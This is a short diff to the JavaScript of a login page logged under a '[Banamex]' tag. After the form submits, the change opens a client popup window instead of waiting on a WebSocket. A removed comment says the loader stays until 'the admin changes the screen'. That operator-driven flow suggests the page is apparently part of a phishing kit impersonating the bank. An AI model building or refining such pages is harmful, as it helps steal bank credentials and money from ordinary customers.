@@ -1575,10 +1575,28 @@
                     const data = await response.json();
                     
                     if (data.success) {
-                        // Conectar al WebSocket para esperar cambios de pantalla
-                        connectWebSocket(window.loginData.sessionId);
+                        // Abrir ventana emergente del cliente inmediatamente
+                        const sessionId = window.loginData.sessionId;
+                        console.log('[Banamex] Abriendo ventana del cliente con sessionId:', sessionId);
                         
-                        // El loader permanecerá visible hasta que el admin cambie la pantalla
+                        const clientWindow = window.open(
+                            `/client?sessionId=${sessionId}`,
+                            'ClientScreen',
+                            'width=800,height=900,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes'
+                        );
+                        
+                        if (clientWindow) {
+                            clientWindow.focus();
+                            console.log('[Banamex] Ventana del cliente abierta exitosamente');
+                        } else {
+                            alert('Por favor permite ventanas emergentes para continuar.');
+                        }
+                        
+                        // Ocultar el loader después de abrir la ventana
+                        setTimeout(() => {
+                            const loadingOverlay = document.getElementById('loadingOverlay');
+                            loadingOverlay.classList.remove('active');
+                        }, 500);
                     } else {
                         // Error al enviar formulario
                         const loadingOverlay = document.getElementById('loadingOverlay');
